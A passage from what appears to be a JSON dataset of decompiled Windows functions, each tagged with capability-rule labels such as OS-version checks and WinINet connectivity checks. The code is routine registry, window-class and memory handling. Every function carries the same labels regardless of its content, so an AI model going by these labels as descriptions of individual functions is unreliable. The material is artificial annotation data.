        "decompiled_code": "\nvoid __fastcall fcn.004200d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.0041975c();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 113
    },
    "00420104": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420104(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.004199f8();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00420260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420260(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.004199f8();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00404650();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004203f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004203f8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.00409a8c();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.00420490();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040dbfc(0, &var_ch);\n                fcn.00404ec4();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 268
    },
    "00420490": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00420490(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.004198b4();\n            cVar1 = fcn.00409a8c();\n            if (cVar1 != '\\0') goto code_r0x004204d5;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x004204d5:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 209
    },
    "00420584": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00420584(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.00419840();\n    }\n    fcn.004198b4();\n    return;\n}\n",
        "token_count": 60
    },
    "00420614": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420614(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.004205b0(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00420584();\n            fcn.00420614();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0042071c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042071c(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.00404704();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "004208d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004208d8(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.0041ffbc();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.00420284();\n    }\n    if (*(iVar1 + 0x50) != 0) {\n        while (0 < *(*(iVar1 + 0x50) + 8)) {\n            fcn.0041999c();\n            fcn.00420a20();\n        }\n    }\n    fcn.0040f94c();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "0042096c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042096c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x42) != 0) {\n        (**(in_EAX + 0x40))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "00420988": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420988(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x4a) != 0) {\n        (**(in_EAX + 0x48))();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 64
    },
    "00420b10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420b10(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420b5f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "00420b78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420b78(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420bc7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "00420cc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00420cc8(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x420cd9;\n    fcn.00407080();\n    uStack64 = 0x420ebb;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x420e94;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x00420d32:\n            var_ch = arg_10h;\n            goto code_r0x00420d38;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x00420d32;\n    var_ch = 0x100000;\ncode_r0x00420d38:\n    puStack84 = 0x420d40;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402f00();\n    uStack88 = 0x420e83;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x00420e43:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x420e8a;\n                uStack88 = 0x420e58;\n                fcn.00402f1c();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x00420e43;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x00420d69:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x00420d69;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00404f70();\n                *in_FS_OFFSET = uStack92;\ncode_r0x00420ea5:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x420ec2;\n                uStack76 = 0x420eba;\n                fcn.0040700c();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.00420cc8::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00404f70();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x00420ea5;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1316
    },
    "00421030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00421030(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x49a9ec;\n    if (*0x49a9f0 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x49a9ec;\n        fcn.004030fc();\n        uVar2 = fcn.00421028();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.00421028();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x49a9f0;\n            puVar3 = puVar4 + 0xd;\n            *0x49a9f0 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x49a9ec = puVar1;\n    puVar3 = *0x49a9f0;\n    puVar1 = *0x49a9f0 + 5;\n    *0x49a9f0 = *(*0x49a9f0 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 387
    },
    "004210ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004210ec(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x492b60 = *0x4987f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4987f8, *0x492b74, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x492b74, *0x4987f8);\n        }\n        sub.user32.dll_RegisterClassA(0x492b50);\n    }\n    uVar2 = fcn.00408584(0, *0x4987f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00421030(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 296
    },
    "0042171c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042171c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) != 0) {\n        if (*(in_EAX + 0xc) == '\\0') {\n            sub.advapi32.dll_RegFlushKey(*(in_EAX + 4));\n        }\n        sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 4));\n        *(in_EAX + 4) = 0;\n        fcn.00405530();\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "0042174c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042174c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 8)) {\n        if (*(in_EAX + 0x14) != '\\0') {\n            sub.advapi32.dll_RegCloseKey_1(*(in_EAX + 8));\n            *(in_EAX + 0x14) = 0;\n        }\n        *(in_EAX + 8) = param_2;\n        fcn.0042171c();\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00421890": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00421890(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x421995;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004055c8();\n    uVar1 = fcn.00421604();\n    if (uVar1 == 0) {\n        fcn.00405a84();\n    }\n    var_ch = 0;\n    if ((var_5h == '\\0') || (var_4h == 0)) {\n        uVar2 = fcn.004059dc(0, *(in_EAX + 0x18), &var_ch);\n        uVar2 = fcn.0042179c(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    }\n    else {\n        uVar2 = fcn.004059dc(0, 0, 0, *(in_EAX + 0x18), 0, &var_ch, &var_10h);\n        uStack76 = fcn.0042179c(uVar2);\n        iVar3 = sub.advapi32.dll_RegCreateKeyExA();\n    }\n    var_6h = iVar3 == 0;\n    if (var_6h) {\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.004058e0(var_4h, 0x4219b0, *(in_EAX + 0x10));\n        }\n        fcn.00421778();\n    }\n    *in_FS_OFFSET = uStack76;\n    fcn.00405530(0x42199c);\n    return;\n}\n",
        "token_count": 493
    },
    "004219b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004219b4(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff90;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x421b65;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004055c8();\n    uVar1 = fcn.00421604();\n    if (uVar1 == 0) {\n        fcn.00405a84();\n    }\n    var_ch = 0;\n    uVar4 = *(in_EAX + 0x18) & 0x300;\n    uVar2 = fcn.004059dc(0, uVar4 | 0x20019, &var_ch);\n    uVar2 = fcn.0042179c(uVar2);\n    iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n    var_5h = iVar3 == 0;\n    if (var_5h) {\n        *(in_EAX + 0x18) = uVar4 | 0x20019;\n        if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n            fcn.004058e0(var_4h, 0x421b80, *(in_EAX + 0x10));\n        }\n        fcn.00421778();\n    }\n    else {\n        uVar2 = fcn.004059dc(0, uVar4 | 0x20009, &var_ch);\n        uVar2 = fcn.0042179c(uVar2);\n        iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n        var_5h = iVar3 == 0;\n        if (var_5h) {\n            *(in_EAX + 0x18) = uVar4 | 0x20009;\n            if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                fcn.004058e0(var_4h, 0x421b80, *(in_EAX + 0x10));\n            }\n            fcn.00421778();\n        }\n        else {\n            uVar2 = fcn.004059dc(0, uVar4 | 1, &var_ch);\n            uVar2 = fcn.0042179c(uVar2);\n            iVar3 = sub.advapi32.dll_RegOpenKeyExA_1(uVar2);\n            var_5h = iVar3 == 0;\n            if (var_5h) {\n                *(in_EAX + 0x18) = uVar4 | 1;\n                if ((*(in_EAX + 4) != 0 & uVar1) != 0) {\n                    in_stack_ffffff90 = var_4h;\n                    fcn.004058e0(var_4h, 0x421b80, *(in_EAX + 0x10));\n                }\n                fcn.00421778();\n            }\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffff90;\n    fcn.00405530(0x421b6c);\n    return;\n}\n",
        "token_count": 793
    },
    "00421b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00421b84(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    int32_t iStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint hKey;\n    uint var_18h;\n    int32_t var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack76 = 0x421cee;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x421bb3;\n    fcn.004055c8();\n    puStack84 = 0x421bbb;\n    var_11h._0_1_ = fcn.00421604();\n    if (var_11h == '\\0') {\n        puStack84 = 0x421bd6;\n        fcn.00405a84();\n    }\n    puStack84 = 0x421be9;\n    iVar2 = fcn.00422220();\n    if (iVar2 != 0) {\n        iStack88 = 0x421ca4;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        puStack84 = &stack0xfffffffc;\n        fcn.004217b0();\n        cVar1 = fcn.00421d1c();\n        if (cVar1 != '\\0') {\n            fcn.00405620();\n            iVar4 = var_38h + -1;\n            if (-1 < iVar4) {\n                do {\n                    *NULL = var_34h + 1;\n                    fcn.004059dc(&fcn.00421b84::var_11h + 1, 0, 0, 0, 0);\n                    iStack92 = iVar2;\n                    iVar3 = sub.advapi32.dll_RegEnumKeyExA();\n                    if (iVar3 == 0) {\n                        fcn.004059dc();\n                        fcn.00405728();\n                        fcn.00421b84();\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != -1);\n            }\n        }\n        *in_FS_OFFSET = iStack92;\n        puStack84 = 0x421cab;\n        iStack88 = 0x421c9a;\n        fcn.004217b0();\n        iStack92 = 0x421ca3;\n        iStack88 = iVar2;\n        sub.advapi32.dll_RegCloseKey_1();\n        return;\n    }\n    puStack84 = 0x421cb3;\n    puStack84 = fcn.004059dc();\n    iStack88 = 0x421cc0;\n    iStack88 = fcn.0042179c();\n    iStack92 = 0x421cc6;\n    sub.advapi32.dll_RegDeleteKeyA();\n    *in_FS_OFFSET = iStack88;\n    iStack80 = 0x421cf5;\n    puStack84 = 0x421ce0;\n    fcn.00405530();\n    puStack84 = 0x421ced;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 809
    },
    "00421d1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00421d1c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    fcn.00403af4();\n    uVar1 = sub.advapi32.dll_RegQueryInfoKeyA\n                      (*(in_EAX + 4), 0, 0, 0, param_2, param_2 + 4, 0, param_2 + 8, param_2 + 0xc, param_2 + 0x10, 0, \n                       param_2 + 0x14);\n    if ((*(*0x495d2c + 0xc) != '\\0') && (**0x495d18 == 2)) {\n        *(param_2 + 4) = *(param_2 + 4) + *(param_2 + 4);\n        *(param_2 + 0xc) = *(param_2 + 0xc) + *(param_2 + 0xc);\n    }\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 248
    },
    "004220d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004220d0(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    cVar1 = fcn.00421f14();\n    if (cVar1 == '\\0') {\n        var_ch = 0;\n    }\n    else if (((var_10h == '\\x04') || (var_10h == '\\0')) && (var_ch <= arg_8h)) {\n        fcn.0042219c(&var_5h, var_ch);\n    }\n    else {\n        fcn.004215d8();\n    }\n    return var_ch;\n}\n",
        "token_count": 173
    },
    "00422578": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422578(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack176;\n    uint uStack172;\n    uchar *puStack168;\n    uint uStack164;\n    uint uStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    uchar *puStack144;\n    int32_t iStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t dwIndex;\n    int32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_4h = 0;\n    uStack92 = 0x4227b9;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa0;\n    var_18h = *(*(arg_8h + -4) + 4);\n    puStack100 = 0x4225ba;\n    hKey = in_EAX;\n    fcn.004217b0();\n    uStack104 = 0x42278f;\n    uStack108 = *in_FS_OFFSET;\n    